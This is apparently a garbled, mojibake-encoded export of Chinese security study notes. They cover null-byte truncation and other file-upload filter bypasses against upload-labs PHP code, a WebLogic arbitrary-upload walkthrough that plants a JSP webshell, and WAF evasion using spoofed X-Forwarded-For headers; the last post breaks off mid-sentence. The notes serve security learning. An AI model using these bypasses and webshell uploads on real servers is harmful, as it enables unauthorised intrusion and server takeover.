ç™½åå•00æˆªæ–­00æˆªæ–­åˆ†ä¸º%00æˆªæ–­å’Œ0x00æˆªæ–­ã€‚å½“ä¸€ä¸ªå­—ç¬¦ä¸²ä¸­å­˜åœ¨ç©ºå­—ç¬¦çš„æ—¶å€™ï¼Œåœ¨è¢«è§£æçš„æ—¶å€™ä¼šå¯¼è‡´ç©ºå­—ç¬¦åé¢çš„å­—ç¬¦è¢«ä¸¢å¼ƒã€‚ åˆ©ç”¨æ¡ä»¶ï¼š121.åç¼€æ£€æµ‹ï¼Œåˆæ ¼åˆ™è¿›è¡Œä¸Šä¼ è·¯å¾„æ‹¼æ¥ï¼ˆç™½åå•ï¼‰2.æ‹¼æ¥è·¯å¾„å’Œæ–‡ä»¶åï¼Œç»„æˆæ–‡ä»¶ä¸Šä¼ è·¯å¾„ 1æˆªæ–­æ¡ä»¶ï¼šphpç‰ˆæœ¬å°äº5.3.4ï¼Œphpçš„magic_quotes_gpcä¸ºOFFçŠ¶æ€ åˆ©ç”¨ï¼ˆæ»¡è¶³å…¶ä¸­ä¸€ä¸ªå°±è¡Œï¼‰121.è·¯å¾„æ‹¼æ¥ç›´æ¥ä½¿ç”¨çš„ $file_nameè¿™ä¸ªæ–‡ä»¶åï¼Œè€Œä¸æ˜¯ $file_extå’Œå…¶ä»–ä»€ä¹ˆä¸œè¥¿æ¥æ‹¼æˆä¸€ä¸ªæ–‡ä»¶åå­—ï¼Œè¿™æ—¶æ–‡ä»¶åä¸­è¿˜æ˜¯åŒ…å«æˆªæ–­å­—ç¬¦çš„ï¼Œè·¯å¾„æ‹¼å¥½ä¹‹åå¯ä»¥è¢«æˆªæ–­æˆæƒ³è¦çš„.phpã€‚2.æ–‡ä»¶è·¯å¾„å¯æ§ï¼Œæ¯”å¦‚æˆ‘å¯ä»¥ä¿®æ”¹è·¯å¾„æ‹¼æ¥çš„pathæ—¶ï¼Œæ¯”å¦‚æŠ“åˆ°çš„åŒ…ä¸­å­˜åœ¨path: uploads/ï¼Œå°±å¯ä»¥ç›´æ¥æŠŠè·¯å¾„æ„é€ æˆuploads/xxx.php%00 %00æˆªæ–­12www.xxx.com/qq.jpgwww.xxx.com/qq.php%00.jpg =&gt; www.xxx.com/qq.php %00æˆªæ–­ GETç”¨æ³• å½“æ˜¯GETæ¥æ”¶æƒ…å†µçš„æ—¶å€™ï¼Œç›´æ¥ç”¨ %00 å°±å¯ä»¥äº†ã€‚ æŸäº›æƒ…å†µä¸‹ï¼Œç›´æ¥åœ¨æ–‡ä»¶åä¸­åŠ  %00 è¿›è¡Œæˆªæ–­è¿™æ˜¯ä¸å¯¹çš„ï¼Œå› ä¸º %00 ä¼šä»¥å­—ç¬¦ä¸²çš„å½¢å¼è§£æäº†ã€‚ å¦‚æœæ²¡æœ‰åšåç¼€ååˆ¤æ–­çš„æƒ…å†µä¸‹ï¼Œé‚£æ ·ä¼šå˜æˆï¼š 1www.xxx.com/qq.php%00.jpg =&gt; www.xxx.com/qq.php%00.jpg ä¹Ÿå°±æ˜¯æ‰€è°“çš„ä»»æ„æ–‡ä»¶ä¸Šä¼ æ¼æ´äº†ï¼Œè¿™åˆæ˜¯å¦ä¸€ä¸ªæ¦‚å¿µäº†ã€‚ %00æˆªæ–­ POST ç”¨æ³• å½“æ˜¯POSTæ¥æ”¶æƒ…å†µçš„æ—¶å€™ï¼Œæ­£ç¡®çš„ç”¨æ³•åº”è¯¥æ˜¯æˆ‘ä»¬éœ€è¦å¯¹ %00 åšä¸€ä¸ªURLè§£ç ï¼Œä¹Ÿå°±æ˜¯URL-decodeï¼› ä¸ºä»€ä¹ˆä¸¤è€…ç”¨æ³•ä¸åŒï¼Ÿ è¿™æ˜¯å› ä¸º %00 æˆªæ–­åœ¨ GET ä¸­è¢« url è§£ç ä¹‹åæ˜¯ç©ºå­—ç¬¦ã€‚ä½†æ˜¯åœ¨ POST ä¸­ %00 ä¸ä¼šè¢« url è§£ç ï¼Œæ‰€ä»¥åªèƒ½é€šè¿‡ burpsuite ä¿®æ”¹ hex å€¼ä¸º 00 ï¼ˆURL decodeï¼‰è¿›è¡Œæˆªæ–­ã€‚ æ³¨æ„ï¼š æœ‰äº›æ—¶å€™æ•°æ®åŒ…ä¸­å¿…é¡»å«æœ‰ä¸Šä¼ æ–‡ä»¶åçš„ç›®å½•æƒ…å†µæ‰å¯ä»¥ç”¨ã€‚ ä¾‹å¦‚ï¼šæ•°æ®åŒ…ä¸­å­˜åœ¨ path: uploads/ï¼Œé‚£ä¹ˆæ”»å‡»è€…å¯ä»¥é€šè¿‡ä¿®æ”¹pathçš„å€¼æ¥æ„é€ paylod: uploads/aa.php%00 åƒä»¥ä¸‹è¿™ä¸ªPHPæ–‡ä»¶ä¸Šä¼ æ£€æµ‹ä»£ç ï¼Œè¿™ä¸ªå°±éœ€è¦æœ‰ä¸Šä¼ æ–‡ä»¶åçš„ç›®å½•æ‰èƒ½ç”¨ã€‚ 12345678910111213$uploaded_name = $_FILES[ &#x27;file&#x27; ][ &#x27;name&#x27; ];$uploaded_ext = substr( $uploaded_name, strrpos( $uploaded_name, &#x27;.&#x27; ) + 1); // æå–ä¸Šä¼ æ–‡ä»¶åç¼€$target_name = md5( uniqid() . $uploaded_name ) . &#x27;.&#x27; . $uploaded_ext; // å¯¹ä¸Šä¼ æ–‡ä»¶è¿›è¡Œé‡å‘½åif( ( strtolower( $uploaded_ext ) == &quot;jpg&quot; || strtolower( $uploaded_ext ) == &quot;jpeg&quot; || strtolower( $uploaded_ext ) == &quot;png&quot; )) &#123; move_uploaded_file($_FILES[&quot;file&quot;][&quot;tmp_name&quot;], $dir . $target_name); // å°†ä¸´æ—¶æ–‡ä»¶ç§»åŠ¨åˆ°æŒ‡å®šç›®å½• $result = $dir . $target_name; echo &quot;Stored in: $result&quot;; &#125;else&#123; echo &quot;Invalid file&quot;;&#125; ä¸ºä»€ä¹ˆä¿®æ”¹pathæ‰å¯ä»¥ï¼Ÿ å› ä¸ºç¨‹åºä¸­æ£€æµ‹çš„æ˜¯æ–‡ä»¶çš„åç¼€åï¼Œå¦‚æœåç¼€åˆæ³•åˆ™æ‹¼æ¥è·¯å¾„å’Œæ–‡ä»¶åã€‚ é‚£ä¹ˆï¼Œæ”»å‡»è€…ä¿®æ”¹äº†pathä»¥åçš„æ‹¼æ¥ç»“æœä¸ºï¼šuploads/aaa.php%00/20190818.php ç§»åŠ¨æ–‡ä»¶çš„æ—¶å€™ä¼šå°†æ–‡ä»¶ä¿å­˜ä¸ºï¼šuploads/aaa.php ä»è€Œè¾¾åˆ°Getshellæ•ˆæœã€‚ ä¾‹å­ 1http://127.0.0.1/upload-labs/Pass-11/index.php æ£€æµ‹ä»£ç  1234567891011121314151617181920$is_upload = false;$msg = null;if(isset($_POST[&#x27;submit&#x27;]))&#123; $ext_arr = array(&#x27;jpg&#x27;,&#x27;png&#x27;,&#x27;gif&#x27;); $file_ext = substr($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;],strrpos($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;],&quot;.&quot;)+1); if(in_array($file_ext,$ext_arr))&#123; $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;]; $img_path = $_GET[&#x27;save_path&#x27;].&quot;/&quot;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext; if(move_uploaded_file($temp_file,$img_path))&#123; $is_upload = true; &#125; else&#123; $msg = &#x27;ä¸Šä¼ å¤±è´¥ï¼&#x27;; &#125; &#125; else&#123; $msg = &quot;åªå…è®¸ä¸Šä¼ .jpg|.png|.gifç±»å‹æ–‡ä»¶ï¼&quot;; &#125;&#125; ç»•è¿‡ 0x00æˆªæ–­å®ƒä»¬æœ€ç»ˆçš„ç»“æœéƒ½æ˜¯ä¸€æ ·çš„ï¼Œéƒ½ä»£è¡¨ç€chr(0)ï¼Œå³ç©ºå­—ç¬¦ï¼Œåªä¸è¿‡ä½¿ç”¨çš„ä½ç½®ä¸åŒï¼Œ0x00ä»£è¡¨16è¿›åˆ¶çš„ç©ºå­—ç¬¦00ï¼Œéœ€è¦åœ¨HEXä¸­æ”¹ä¸º00ï¼Œè¿›è¡Œæˆªæ–­ï¼Œè€Œ%00æ˜¯URLè§£ç ä¹‹å‰çš„å­—ç¬¦ï¼Œå®ƒè¢«è§£ç æˆ16è¿›åˆ¶ASCIIç ä¹‹åå®é™…ä¸Šä¹Ÿæ˜¯0x00ï¼Œæ‰€ä»¥å®ƒä»¬æœ€ç»ˆéƒ½å¯¹åº”çš„æ˜¯ç©ºå­—ç¬¦ã€‚ 1http://127.0.0.1/upload-labs/Pass-12/index.php æ£€æµ‹ä»£ç  1234567891011121314151617181920$is_upload = false;$msg = null;if(isset($_POST[&#x27;submit&#x27;]))&#123; $ext_arr = array(&#x27;jpg&#x27;,&#x27;png&#x27;,&#x27;gif&#x27;); $file_ext = substr($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;],strrpos($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;],&quot;.&quot;)+1); if(in_array($file_ext,$ext_arr))&#123; $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;]; $img_path = $_POST[&#x27;save_path&#x27;].&quot;/&quot;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext; if(move_uploaded_file($temp_file,$img_path))&#123; $is_upload = true; &#125; else&#123; $msg = &quot;ä¸Šä¼ å¤±è´¥&quot;; &#125; &#125; else&#123; $msg = &quot;åªå…è®¸ä¸Šä¼ .jpg|.png|.gifç±»å‹æ–‡ä»¶ï¼&quot;; &#125;&#125; 12$img_path = $_POST[&#x27;save_path&#x27;].&quot;/&quot;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext;è¿™é‡Œè·å–è·¯å¾„ç”¨çš„æ˜¯POST ç»•è¿‡ æ–¹æ³•1: å› ä¸ºè·å–è·¯å¾„ç”¨çš„æ˜¯POSTï¼Œæ‰€æœ‰è¿™é‡Œéœ€è¦åœ¨ä¿®æ”¹ä¸€ä¸‹ç¼–ç  æ–¹æ³•2: é€šè¿‡0x00ç»•è¿‡ å‚è€ƒ12https://blog.csdn.net/weixin_44840696/article/details/90581104https://www.fujieace.com/penetration-test/file-upload-00.html#google_vignette","categories":[],"tags":[{"name":"Web","slug":"Web","permalink":"https://al0nez.github.io/tags/Web/"},{"name":"å°è¿ªå­¦ä¹ ç¬”è®°","slug":"å°è¿ªå­¦ä¹ ç¬”è®°","permalink":"https://al0nez.github.io/tags/%E5%B0%8F%E8%BF%AA%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"name":"æ–‡ä»¶ä¸Šä¼ ","slug":"æ–‡ä»¶ä¸Šä¼ ","permalink":"https://al0nez.github.io/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"}]},{"title":"20WEBæ¼æ´--æ–‡ä»¶ä¸Šä¼ ä¹‹åŸºç¡€åŠè¿‡æ»¤æ–¹å¼","slug":"20WEBæ¼æ´-æ–‡ä»¶ä¸Šä¼ ä¹‹åŸºç¡€åŠè¿‡æ»¤æ–¹å¼","date":"2021-09-21T02:30:34.000Z","updated":"2021-09-21T06:01:54.751Z","comments":true,"path":"2021/09/21/20WEBæ¼æ´-æ–‡ä»¶ä¸Šä¼ ä¹‹åŸºç¡€åŠè¿‡æ»¤æ–¹å¼/","link":"","permalink":"https://al0nez.github.io/2021/09/21/20WEB%E6%BC%8F%E6%B4%9E-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E4%B9%8B%E5%9F%BA%E7%A1%80%E5%8F%8A%E8%BF%87%E6%BB%A4%E6%96%B9%E5%BC%8F/","excerpt":"ğŸ˜†ğŸ˜†ğŸ˜†ğŸ˜†ğŸ˜†ğŸ˜†","text":"ğŸ˜†ğŸ˜†ğŸ˜†ğŸ˜†ğŸ˜†ğŸ˜† çŸ¥è¯†æ±‡æ€»ä»€ä¹ˆæ˜¯æ–‡ä»¶ä¸Šä¼ æ¼æ´ï¼Ÿå‡¡æ˜¯å­˜åœ¨æ–‡ä»¶ä¸Šä¼ çš„åœ°æ–¹ï¼Œéƒ½æœ‰å¯èƒ½å­˜åœ¨æ–‡ä»¶ä¸Šä¼ æ¼æ´ã€‚å…³é”®æ˜¯çœ‹å¯¹æ–¹çš„é˜²æŠ¤ä»£ç å†™çš„æ˜¯å¦å®‰å…¨ï¼Œå…¨é¢ï¼Œä¸€æ—¦æœ‰ä¸€ä¸ªåœ°æ–¹å¯ä»¥ç»•è¿‡ï¼Œå°±ä¼šé€ æˆæ–‡ä»¶ä¸Šä¼ æ¼æ´ã€‚ åŸç†æ–‡ä»¶ä¸Šä¼ æ¼æ´æ˜¯æŒ‡ç”¨æˆ·ä¸Šä¼ äº†ä¸€ä¸ªå¯æ‰§è¡Œçš„è„šæœ¬æ–‡ä»¶ï¼Œå¹¶é€šè¿‡æ­¤è„šæœ¬æ–‡ä»¶è·å¾—äº†æ‰§è¡ŒæœåŠ¡å™¨ç«¯å‘½ä»¤çš„èƒ½åŠ›ã€‚æ–‡ä»¶ä¸Šä¼ è¿™ä¸ªåŠŸèƒ½æœ¬èº«æ²¡æœ‰é—®é¢˜ï¼Œæœ‰é—®é¢˜çš„æ˜¯æ–‡ä»¶ä¸Šä¼ åï¼ŒæœåŠ¡å™¨æ€ä¹ˆå¤„ç†ã€è§£é‡Šæ–‡ä»¶ã€‚å¦‚æœæœåŠ¡å™¨çš„å¤„ç†é€»è¾‘ä¸å¤Ÿå®‰å…¨ï¼Œå°±ä¼šå¯¼è‡´ä¸Šä¼ çš„æ–‡ä»¶è¢«webå®¹å™¨è§£é‡Šæ‰§è¡Œï¼Œä»è€Œé€ æˆä¸¥é‡çš„åæœ å±å®³å¯ä»¥è‡ªå®šä¹‰ï¼Œå¯ä»¥æˆä¸ºwebshellï¼Œé€šè¿‡æ–‡ä»¶ä¸Šä¼ æ¥ä¸Šä¼ ç½‘ç«™åé—¨ï¼Œç›´æ¥è·å–ç½‘ç«™æƒé™ï¼Œå±äºé«˜å±æ¼æ´ã€‚ä¸Šä¼ æ¼æ´ä¸SQLæ³¨å…¥æˆ– XSSç›¸æ¯” , å…¶é£é™©æ›´å¤§ ã€‚å¯ä»¥è·å–æ•°æ®åº“ä¿¡æ¯ï¼Œå¯ä»¥å¯¹æœåŠ¡å™¨ææƒï¼Œè·å–å†…ç½‘æƒé™ åˆ¤æ–­å¯¹æ–‡ä»¶ä¸Šä¼ è¿›è¡ŒæŠ“åŒ…ï¼Œç„¶åè¿›è¡Œåˆ¤æ–­ æ³¨æ„åœ°æ–¹å¯¹æ–‡ä»¶ä¸Šä¼ ç±»å‹è¿›è¡ŒåŒºåˆ†ï¼Œæ˜¯å±äºç¼–è¾‘å™¨æ–‡ä»¶ä¸Šä¼ ï¼Œè¿˜æ˜¯å±äºç¬¬ä¸‰æ–¹åº”ç”¨ï¼Œè¿˜æ˜¯ä¼šå‘˜ä¸­å¿ƒã€‚è¦ç¡®ä¿æ–‡ä»¶ä¸Šä¼ æ˜¯ä»€ä¹ˆç±»å‹ï¼Œå°±ç”¨ä»€ä¹ˆç±»å‹æ–¹æ³•å¯¹å®ƒè¿›è¡ŒåæœŸçš„æµ‹è¯•ã€‚ åœ¨å®é™…ä¸­çš„åº”ç”¨è¯´æ˜æ–¹æ³•ä¸€â€‹ å…ˆç›´æ¥ä¼ ä¸€ä¸ªPHPï¼Œå®æˆ˜å…ˆä¼ é©¬ã€‚ â€‹ å®æˆ˜å…ˆä¼ ä¸€ä¸ªæ­£å¸¸çš„å›¾ç‰‡ï¼Œçœ‹çœ‹æœ‰æ— è¿”å›å­˜å‚¨åœ°å€ã€‚ â€‹ å¦‚æœèƒ½ç›´æ¥ä¸Šä¼ å¹¶è§£æï¼Œå·²ç¦»æˆåŠŸä¸è¿œã€‚ æ–¹æ³•äºŒâ€‹ å…ˆä¼ ä¸€ä¸ªshellï¼Œç„¶åè¿›è¡Œä¿®æ”¹ã€‚ â€‹ connect-Type:image/jpegï¼Œçœ‹çœ‹æ˜¯å¦å¯ä»¥è¿›è¡Œç»•è¿‡ï¼Œå¦‚æœä¸è¡Œï¼Œåœ¨ä¸Šä¼ å†…å®¹æ·»åŠ GIF89a â€‹ å½“ç„¶ä¸Šä¼ äº†è¿˜å¾—çœ‹æ˜¯å¦èƒ½å¤Ÿè¢«è§£æä¸ºphpï¼Œæ‰€æœ‰çš„ä¸Šä¼ éƒ½è¦è€ƒè™‘æ˜¯å¦èƒ½å¤Ÿè¢«è§£æã€‚ æ–¹æ³•ä¸‰ ä¸Šä¼ ä¸€ä¸ªabc.abcdï¼Œç›®çš„åªæ˜¯ä¸ºäº†æŸ¥çœ‹æ˜¯å¦ä¸ºç™½åå•è¿˜æ˜¯é»‘åå•ç»•è¿‡ã€‚ â€‹ é»‘åå•é™åˆ¶ä¸€èˆ¬ä¸ºæ­¤æ–‡ä»¶ç±»å‹ä¸å…è®¸ä¸Šä¼ ï¼Œè€ƒè™‘åŒå†™ï¼Œå¤§å°å†™ï¼Œç©ºæ ¼ï¼Œphp2,php3,php4,php5,pht â€‹ phtml,ç­‰æ–¹å¼ æˆ‘ä»¬ç»§ç»­ä¸Šä¼ ä¸€ä¸ª/htaccessæ–‡ä»¶ â€‹ .htaccessæ–‡ä»¶èƒ½å¤Ÿè®¾ç½®æœåŠ¡å™¨çš„è§£ææ–‡ä»¶çš„æ ¼å¼ï¼ŒåŒ¹é…åˆ°duduå°±å·²phpçš„æ ¼å¼æ¥è§£æï¼Œç»§è€Œä¸Šä¼ é©¬ å¦‚æœè¯´.htaccessä¸èƒ½ä¸Šä¼ ï¼Œæ¥ä¸‹æ¥ä¸Šä¼ ä¸€ä¸ª.user.iniï¼Œç»§è€Œä¸Šä¼ ä¸€ä¸ªé©¬ æ–¹æ³•å››â€‹ å¦‚æœç™½åå•é™åˆ¶ä¸Šä¼  è€ƒè™‘00æˆªæ–­ä¸Šä¼  æ–‡ä»¶åŒ…å«æ¼æ´+å›¾ç‰‡é©¬ æ–‡ä»¶åŒ…å«æ¼æ´+äºŒæ¬¡æ¸²æŸ“+å›¾ç‰‡é©¬ æ–¹æ³•äº”â€‹ ä¸Šä¼ çš„ä¸œè¥¿æ˜¯å¦è¢«æœåŠ¡å™¨å¾ˆå¿«çš„åˆ é™¤æˆ–è€…ç§»é™¤ï¼Œæˆ–è€…è¯´ä¸Šä¼ æˆåŠŸï¼Œä½†æ˜¯æ— æ³•è®¿é—®ï¼Œå°±å¾—è€ƒè™‘æ¡ä»¶ç«äº‰ã€‚ â€‹ ä»¥ä¸Šå‡ä¸è¡Œï¼Œè€ƒè™‘é€»è¾‘å±‚é¢çš„æ€è·¯ æ¼”ç¤ºæ¡ˆä¾‹ï¼šå¸¸è§„æ–‡ä»¶ä¸Šä¼ åœ°å€çš„è·å–è¯´æ˜é€šè¿‡æœç´¢å¸¦æœ‰uploadå…³é”®å­—çš„ç½‘é¡µ é€šè¿‡ç›®å½•æ‰«æå·¥å…·è¿›è¡Œæ‰«æ ä¸åŒæ ¼å¼ä¸‹çš„æ–‡ä»¶ç±»å‹åé—¨æµ‹è¯•ä¸è¦å¦„æƒ³é€šè¿‡ä¸€ä¸ªå¸¦æœ‰åé—¨çš„å›¾ç‰‡åç¼€çš„æ–‡ä»¶æ¥æ§åˆ¶ç½‘ç«™ï¼Œå…³é”®æ˜¯è¦çœ‹ç½‘ç«™å¯¹è„šæœ¬çš„è§£ææ˜¯ä»€ä¹ˆç±»å‹ ä»€ä¹ˆæ ¼å¼çš„ä»£ç å°±ç”¨ä»€ä¹ˆæ ¼å¼å»æ‰§è¡Œï¼Œä¸å¯ä»¥ä¹±ç”¨ï¼Œå¦åˆ™æ˜¯æ‰§è¡Œä¸äº†çš„ã€‚ é…åˆè§£ææ¼æ´ä¸‹çš„æ–‡ä»¶ç±»å‹åé—¨æµ‹è¯•nginxè§£ææ¼æ´ æˆ‘ä»¬ä¸Šä¼ ä¸€ä¸ªæ­£å¸¸çš„å›¾ç‰‡ï¼Œå›¾ç‰‡ä¸­å†™å¦‚phpä»£ç ï¼Œå½“æˆ‘ä»¬å»è®¿é—®å›¾ç‰‡çš„æ—¶å€™ï¼Œå›¾ç‰‡ä¸ä¼šæ‰§è¡Œphpä»£ç ã€‚ å½“æˆ‘ä»¬åœ¨åé¢åŠ ä¸Š1.phpåï¼ŒNginxå°±ä¼šé€ æˆä¸€ä¸ªè§£ææ¼æ´ï¼Œphpä»£ç å°±ä¼šè¢«æ‰§è¡Œã€‚ æœ¬åœ°æ–‡ä»¶ä¸Šä¼ æ¼æ´é¶åœºç¯å¢ƒæ­å»ºæµ‹è¯• åœ¨å®¢æˆ·ç«¯é€šè¿‡å¦‚ä¸‹çš„javascriptä»£ç æ¥æ£€æµ‹ç”¨æˆ·æäº¤çš„æ–‡ä»¶æ˜¯å¦åˆæ³•ï¼š 1234567891011121314151617function checkFile() &#123; var file = document.getElementsByName(&#x27;upload_file&#x27;)[0].value; if (file == null || file == &quot;&quot;) &#123; alert(&quot;è¯·é€‰æ‹©è¦ä¸Šä¼ çš„æ–‡ä»¶!&quot;); return false; &#125; //å®šä¹‰å…è®¸ä¸Šä¼ çš„æ–‡ä»¶ç±»å‹ var allow_ext = &quot;.jpg|.png|.gif&quot;; //æå–ä¸Šä¼ æ–‡ä»¶çš„ç±»å‹ var ext_name = file.substring(file.lastIndexOf(&quot;.&quot;)); //åˆ¤æ–­ä¸Šä¼ æ–‡ä»¶ç±»å‹æ˜¯å¦å…è®¸ä¸Šä¼  if (allow_ext.indexOf(ext_name + &quot;|&quot;) == -1) &#123; var errMsg = &quot;è¯¥æ–‡ä»¶ä¸å…è®¸ä¸Šä¼ ï¼Œè¯·ä¸Šä¼ &quot; + allow_ext + &quot;ç±»å‹çš„æ–‡ä»¶,å½“å‰æ–‡ä»¶ç±»å‹ä¸ºï¼š&quot; + ext_name; alert(errMsg); return false; &#125;&#125; å¦‚ä½•åˆ¤æ–­æ˜¯å¦æ˜¯å®¢æˆ·ç«¯jsæ£€æµ‹ 1ã€é€‰æ‹©ä¸€ä¸ª.phpåç¼€çš„æ–‡ä»¶ï¼ŒåŒæ—¶ä½¿ç”¨burp suiteè¿›è¡ŒæŠ“åŒ… 2ã€ç‚¹å‡»ä¸Šä¼ ï¼Œå¯ä»¥çœ‹åˆ°è¿˜æ²¡æœ‰æ•°æ®ç»è¿‡burp suiteï¼Œæµè§ˆå™¨å°±å·²ç»å¼¹å‡ºè­¦ç¤ºæ¡†ï¼Œè¯´æ˜æ•°æ®è¿˜æ²¡æœ‰å‘é€ç»™æœåŠ¡å™¨ï¼Œç¨‹åºå°±åˆ¤æ–­å‡ºæ¥æ–‡ä»¶ç±»å‹ä¸å¯¹ï¼Œå› æ­¤å°±å¯ä»¥å¾—å‡ºç»“è®ºè¿™ä¸ªæ˜¯é€šè¿‡å®¢æˆ·ç«¯è¿›è¡Œçš„æœ¬åœ°æ–‡ä»¶æ£€æµ‹ ç»•è¿‡æ–¹æ³• ç¬¬ä¸€ç§ ç›´æ¥å°†jsä»£ç åˆ é™¤æ‰å°±å¯ä»¥äº† ç¬¬äºŒç§ å‰ç«¯ä¸Šä¼ ä¸€ä¸ªåˆæ³•çš„æ–‡ä»¶ï¼Œé€šè¿‡æŠ“åŒ…å°†æŠ¥æ–‡æˆªå–ï¼Œç„¶åä¿®æ”¹åç¼€ä¸Šä¼  æŸ CMS åŠ CVE ç¼–å·æ–‡ä»¶ä¸Šä¼ æ¼æ´æµ‹è¯• å¯ä»¥çœ‹åˆ°å›¾ç‰‡ä¸Šä¼ ä¸Šå»äº†ï¼Œä½†æ˜¯æŠ“åŒ…å´æŠ“ä¸åˆ°ï¼Œæ˜¯å› ä¸ºä¸Šä¼ æ“ä½œæ˜¯ä½¿ç”¨JSè¿›è¡ŒéªŒè¯ï¼Œåœ¨æµè§ˆå™¨å‰ç«¯å®Œæˆã€‚ç‚¹å‡»ä¿å­˜æ‰å¯ä»¥æŠ“åˆ°åŒ… æˆ‘ä»¬å°†pngä¿®æ”¹ä¸ºphpä¸Šä¼  å‘ç°æŠ¥é”™ï¼Œè€Œä¸”æ²¡æœ‰è¿”å›è·¯å¾„ï¼Œä½†æ˜¯å»åå°çœ‹å‘ç°ä¸Šä¼ æˆåŠŸäº†ã€‚ åˆå‘ç°äº†ä»–æ˜¯fineCMSï¼Œå»çœ‹ä¸€ä»–æœ‰ä»€ä¹ˆæ¼æ´ æ‰¾åˆ°åˆšæ‰æˆ‘ä»¬é‚£ä¸ªçš„ä¸Šä¼ è·¯å¾„ é€šè¿‡è¯¥è·¯å¾„æˆåŠŸæ‰§è¡Œä»£ç  weblogicä»»æ„æ–‡ä»¶ä¸Šä¼ æ¼æ´ è´¦å·æ˜¯weblogicï¼Œå¯†ç é€šè¿‡ 1docker-compose logs | grep password å¯ä»¥æŸ¥çœ‹ ç‚¹å‡»base_domain ç‚¹å‡»é«˜çº§ å¯ç”¨webæµ‹è¯•é¡µé¢ è®¾ç½®work home dir 1/u01/oracle/user_projects/domains/base_domain/servers/AdminServer/tmp/_WL_internal/com.oracle.webservices.wls.ws-testclient-app-wls/4mcj4y/war/css ç‚¹å‡»å®‰å…¨ï¼Œè¿›è¡Œæ·»åŠ  ä¸Šä¼ jspæœ¨é©¬ è·å–æ—¶é—´æˆ³ 11630587866052 ç„¶åè®¿é—®http://your-ip:7001/ws_utc/css/config/keystore/[æ—¶é—´æˆ³]_[æ–‡ä»¶å]ï¼Œå³å¯æ‰§è¡Œwebshellï¼š 1http://192.168.47.156:7001/ws_utc/css/config/keystore/1630587866052_3.jsp æ‰§è¡ŒæˆåŠŸ","categories":[],"tags":[{"name":"Web","slug":"Web","permalink":"https://al0nez.github.io/tags/Web/"},{"name":"å°è¿ªå­¦ä¹ ç¬”è®°","slug":"å°è¿ªå­¦ä¹ ç¬”è®°","permalink":"https://al0nez.github.io/tags/%E5%B0%8F%E8%BF%AA%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"name":"æ–‡ä»¶ä¸Šä¼ ","slug":"æ–‡ä»¶ä¸Šä¼ ","permalink":"https://al0nez.github.io/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"}]},{"title":"19WEBæ¼æ´--SQLæ³¨å…¥ä¹‹æ·±å…¥WAFæ³¨å…¥ç»•è¿‡","slug":"19WEBæ¼æ´-SQLæ³¨å…¥ä¹‹æ·±å…¥WAFæ³¨å…¥ç»•è¿‡","date":"2021-09-21T02:30:21.000Z","updated":"2021-09-21T06:02:08.024Z","comments":true,"path":"2021/09/21/19WEBæ¼æ´-SQLæ³¨å…¥ä¹‹æ·±å…¥WAFæ³¨å…¥ç»•è¿‡/","link":"","permalink":"https://al0nez.github.io/2021/09/21/19WEB%E6%BC%8F%E6%B4%9E-SQL%E6%B3%A8%E5%85%A5%E4%B9%8B%E6%B7%B1%E5%85%A5WAF%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87/","excerpt":"ğŸ˜†ğŸ˜†ğŸ˜†ğŸ˜†ğŸ˜†ğŸ˜†","text":"ğŸ˜†ğŸ˜†ğŸ˜†ğŸ˜†ğŸ˜†ğŸ˜† å‰è¨€åœ¨æ”»é˜²å®æˆ˜ä¸­ï¼Œå¾€å¾€éœ€è¦æŒæ¡ä¸€äº›ç‰¹æ€§ï¼Œæ¯”å¦‚æœåŠ¡å™¨ã€æ•°æ®åº“ã€åº”ç”¨å±‚ã€WAFå±‚ç­‰ï¼Œä»¥ä¾¿æˆ‘ä»¬æ›´çµæ´»åœ°å»æ„é€ Payloadï¼Œä»è€Œå¯ä»¥å’Œå„ç§WAFè¿›è¡Œå¯¹æŠ—ï¼Œç”šè‡³ç»•è¿‡å®‰å…¨é˜²å¾¡æªæ–½è¿›è¡Œæ¼æ´åˆ©ç”¨ã€‚ ç™½åå•æ–¹å¼ä¸€ï¼šIP ç™½åå• ä»ç½‘ç»œå±‚è·å–çš„ ipï¼Œè¿™ç§ä¸€èˆ¬ä¼ªé€ ä¸æ¥ï¼Œå¦‚æœæ˜¯è·å–å®¢æˆ·ç«¯çš„ IPï¼Œè¿™æ ·å°±å¯èƒ½å­˜åœ¨ä¼ªé€  IP ç»•è¿‡çš„æƒ… å†µã€‚ æµ‹è¯•æ–¹æ³•ï¼š 1234567ä¿®æ”¹ http çš„ header æ¥ bypass wafX-forwarded-for X-remote-IP X-originating-IP x-remote-addrX-Real-ip æ–¹å¼äºŒï¼šé™æ€èµ„æº ç‰¹å®šçš„é™æ€èµ„æºåç¼€è¯·æ±‚ï¼Œå¸¸è§çš„é™æ€æ–‡ä»¶(.js .jpg .swf .css ç­‰ç­‰)ï¼Œç±»ä¼¼ç™½åå•æœºåˆ¶ï¼Œwaf ä¸ºäº†æ£€æµ‹ æ•ˆç‡ï¼Œä¸å»æ£€æµ‹è¿™æ ·ä¸€äº›é™æ€æ–‡ä»¶ååç¼€çš„è¯·æ±‚ã€‚ 12http://10.9.9.201/sql.php?id=1 http://10.9.9.201/sql.php/1.js?id=1 å¤‡æ³¨ï¼šAspx/php åªè¯†åˆ«åˆ°å‰é¢çš„.aspx/.php åé¢åŸºæœ¬ä¸è¯†åˆ« æ–¹å¼ä¸‰ï¼šurl ç™½åå• ä¸ºäº†é˜²æ­¢è¯¯æ‹¦ï¼Œéƒ¨åˆ† waf å†…ç½®é»˜è®¤çš„ç™½åå•åˆ—è¡¨ï¼Œå¦‚ admin/manager/system ç­‰ç®¡ç†åå°ã€‚åªè¦ url 